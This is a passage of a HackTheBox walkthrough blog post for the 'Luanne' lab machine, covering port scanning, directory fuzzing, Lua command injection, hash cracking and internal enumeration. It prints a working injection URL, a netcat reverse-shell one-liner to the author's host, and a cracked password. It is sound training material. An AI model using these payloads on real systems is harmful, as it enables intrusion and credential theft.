<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Luanne from htb" /><meta property="og:locale" content="en" /><meta name="description" content="nmapgave this 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=. |_http-title: 401 Unauthorized |_http-server-header: nginx/1.19.0 | http-robots.txt: 1 disallowed entry |_/weather 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-server-header: Medusa/1.12 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=default |_http-title: Error response Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd searching this Supervisor process managergot me to the default login. https://supervisor.readthedocs.io/_/downloads/en/stable/pdf/ on 19th page then logged in on 9001port reading the robots.txton 80port we know that we have to search something ```bash ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ" /><meta property="og:description" content="nmapgave this 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=. |_http-title: 401 Unauthorized |_http-server-header: nginx/1.19.0 | http-robots.txt: 1 disallowed entry |_/weather 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-server-header: Medusa/1.12 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=default |_http-title: Error response Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd searching this Supervisor process managergot me to the default login. https://supervisor.readthedocs.io/_/downloads/en/stable/pdf/ on 19th page then logged in on 9001port reading the robots.txton 80port we know that we have to search something ```bash ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ" /><link rel="canonical" href="https://darkfears31.github.io/posts/Luanne-From-HTB/" /><meta property="og:url" content="https://darkfears31.github.io/posts/Luanne-From-HTB/" /><meta property="og:site_name" content="darkfears31â€™s Walktroughs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Luanne from htb" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-06T00:00:00+00:00","datePublished":"2024-09-06T00:00:00+00:00","description":"nmapgave this 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=. |_http-title: 401 Unauthorized |_http-server-header: nginx/1.19.0 | http-robots.txt: 1 disallowed entry |_/weather 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-server-header: Medusa/1.12 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=default |_http-title: Error response Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd searching this Supervisor process managergot me to the default login. https://supervisor.readthedocs.io/_/downloads/en/stable/pdf/ on 19th page then logged in on 9001port reading the robots.txton 80port we know that we have to search something ```bash ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ","headline":"Luanne from htb","mainEntityOfPage":{"@type":"WebPage","@id":"https://darkfears31.github.io/posts/Luanne-From-HTB/"},"url":"https://darkfears31.github.io/posts/Luanne-From-HTB/"}</script><title>Luanne from htb | darkfears31's Walktroughs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="darkfears31's Walktroughs"><meta name="application-name" content="darkfears31's Walktroughs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/162694375?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">darkfears31's Walktroughs</a></div><div class="site-subtitle font-italic">An PicoCTF and HackTheBox Walktroughs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/darkfears31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://youtube.com/user/jadehawk" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Luanne from htb</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Luanne from htb</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1725580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/darkfears31">kaikaci</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1348 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p><code class="language-plaintext highlighter-rouge">nmap</code>gave this</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 <span class="o">(</span>NetBSD 20190418-hpn13v14-lpk<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span class="o">(</span>RSA<span class="o">)</span>
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx 1.19.0
| http-auth:
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span><span class="nb">.</span>
|_http-title: 401 Unauthorized
|_http-server-header: nginx/1.19.0
| http-robots.txt: 1 disallowed entry
|_/weather
9001/tcp open  http    Medusa httpd 1.12 <span class="o">(</span>Supervisor process manager<span class="o">)</span>
|_http-server-header: Medusa/1.12
| http-auth:
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span>default
|_http-title: Error response
Service Info: OS: NetBSD<span class="p">;</span> CPE: cpe:/o:netbsd:netbsd
</pre></table></code></div></div><p>searching this <code class="language-plaintext highlighter-rouge">Supervisor process manager</code>got me to the default login. https://supervisor.readthedocs.io/_/downloads/en/stable/pdf/ on 19th page then logged in on <code class="language-plaintext highlighter-rouge">9001</code>port reading the <code class="language-plaintext highlighter-rouge">robots.txt</code>on <code class="language-plaintext highlighter-rouge">80</code>port we know that we have to search something</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-u</span>  http://10.10.10.218/weather/FUZZ

forecast                <span class="o">[</span>Status: 200, Size: 90, Words: 12, Lines: 2, Duration: 83ms]
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">curling</code>the given directory we get this:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nx">curl</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.218/weather/forecast</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">No city specified. Use 'city=list' to list available cities.</span><span class="dl">"</span><span class="p">}</span>
</pre></table></code></div></div><p>then we go on</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nx">curl</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.218/weather/forecast?city=list</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span><span class="dl">"</span><span class="s2">cities</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">London</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Manchester</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Birmingham</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Leeds</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Glasgow</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Southampton</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Liverpool</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Newcastle</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Nottingham</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Sheffield</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Bristol</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Belfast</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Leicester</span><span class="dl">"</span><span class="p">]}</span>
</pre></table></code></div></div><p>after using <code class="language-plaintext highlighter-rouge">ffuf</code>with <code class="language-plaintext highlighter-rouge">special-characters</code>word list and <code class="language-plaintext highlighter-rouge">lua injection</code>we get to this</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nx">http</span><span class="p">:</span><span class="c1">//10.10.10.218/weather/forecast?city=list%27);os.execute(%22id%22)--</span>

<span class="p">{</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span><span class="dl">"</span><span class="s2">error</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
</span></pre></table></code></div></div><p>then we need to get reverse shell without any special characters put this instead of <code class="language-plaintext highlighter-rouge">id</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span>+/tmp/pbf<span class="p">;</span><span class="nb">mkfifo</span>+/tmp/pbf<span class="p">;</span><span class="nb">cat</span>+/tmp/pbf|/bin/sh+-i+2&gt;%261|nc+10.10.16.11+1234+&gt;/tmp/pbf<span class="s1">'
</span></pre></table></code></div></div><p>and we get reverse shell</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25  2020 <span class="nb">.</span>
drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
<span class="nt">-rw-r--r--</span>   1 root  wheel   47 Sep 16  2020 .htpasswd
<span class="nt">-rw-r--r--</span>   1 root  wheel  386 Sep 17  2020 index.html
<span class="nt">-rw-r--r--</span>   1 root  wheel   78 Nov 25  2020 robots.txt
<span class="nv">$ </span><span class="nb">cat</span> .htpasswd
webapi_user:<span class="nv">$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0</span>
</pre></table></code></div></div><p>letâ€™s crack it</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>john <span class="nb">hash</span> <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt

iamthebest       <span class="o">(</span>?<span class="o">)</span>
</pre></table></code></div></div><p>these are the credentials on <code class="language-plaintext highlighter-rouge">80</code>port to login There is nothing there on machine</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nenetstat <span class="nt">-an</span> | <span class="nb">grep </span>LISTEN
tcp        0      0  127.0.0.1.3000         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp        0      0  127.0.0.1.3001         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp        0      0  <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp        0      0  <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp        0      0  <span class="k">*</span>.9001                 <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0  <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
</pre></table></code></div></div><p>So there is an <code class="language-plaintext highlighter-rouge">3001 and 3000</code>port running internally curl it from inside the machine</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre>$ curl localhost:3000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   199  100   199    0     0  66333      0 --:--:-- --:--:-- --:--:-- 66333
<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>401 Unauthorized<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;h1&gt;</span>401 Unauthorized<span class="nt">&lt;/h1&gt;</span>
/: <span class="nt">&lt;pre&gt;</span>No authorization<span class="nt">&lt;/pre&gt;</span>
<span class="nt">&lt;hr&gt;&lt;address&gt;&lt;a</span> <span class="na">href=</span><span class="s">"//localhost:3000/"</span><span class="nt">&gt;</span>localhost:3000<span class="nt">&lt;/a&gt;&lt;/address&gt;</span>
<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
$ curl localhost:3000 --user webapi_user:iamthebest
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0  96500      0 --:--:-- --:--:-- --:--:-- 77200
<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Index<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h3&gt;</span>Weather Forecast API<span class="nt">&lt;/h3&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>List available cities:<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=list"</span><span class="nt">&gt;</span>/weather/forecast?city=list<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>Five day forecast (London)<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=London"</span><span class="nt">&gt;</span>/weather/forecast?city=London<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;hr&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
$ curl localhost:3001 --user webapi_user:iamthebest
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Index<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h3&gt;</span>Weather Forecast API<span class="nt">&lt;/h3&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>List available cities:<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=list"</span><span class="nt">&gt;</span>/weather/forecast?city=list<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>Five day forecast (London)<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=London"</span><span class="nt">&gt;</span>/weather/forecast?city=London<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;hr&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>the <code class="language-plaintext highlighter-rouge">80,3001</code>ports are running the same thing so that means we have to do <code class="language-plaintext highlighter-rouge">lua</code>command injection again</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ps <span class="nt">-auxw</span> | <span class="nb">grep </span>3001
r.michaels  396  0.0  0.0  34996  2024 ?     Is    9:04AM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3001 <span class="nt">-L</span> weather /home
</pre></table></code></div></div><p>This means <code class="language-plaintext highlighter-rouge">r.michaels</code>are running it the normal command injection we used doesnâ€™t work anymore on <code class="language-plaintext highlighter-rouge">9001</code>port we learn this</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>r.michaels  396  0.0  0.0  34996  2024 ?     Is    9:04AM 0:00.00 /usr/libexec/httpd <span class="nt">-u</span> <span class="nt">-X</span> <span class="nt">-s</span> <span class="nt">-i</span> 127.0.0.1 <span class="nt">-I</span> 3001 <span class="nt">-L</span> weather /home/r.michaels/devel/webapi/weather.lua <span class="nt">-P</span> /var/run/httpd_devel.pid <span class="nt">-U</span> r.michaels <span class="nt">-b</span> /home/r.michaels/devel/www
</pre></table></code></div></div><p>Learning all the flags <code class="language-plaintext highlighter-rouge">-u -X -s -i -I -L</code>from manual https://man.netbsd.org/NetBSD-6.0.1/httpd.8</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>**-X**         Enables directory indexing.  A directory index will be gener-
                ated only when the default file (i.e.  _index.html_ normally) is
                not present.

**-u**         Enables the transformation of Uniform Resource Locators of the
                form _/~user/_ into the directory _~user/public_html_ (but see the
                **-p** option above).
</pre></table></code></div></div><p>the <code class="language-plaintext highlighter-rouge">-u</code>means we can access the user directory</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>$ curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
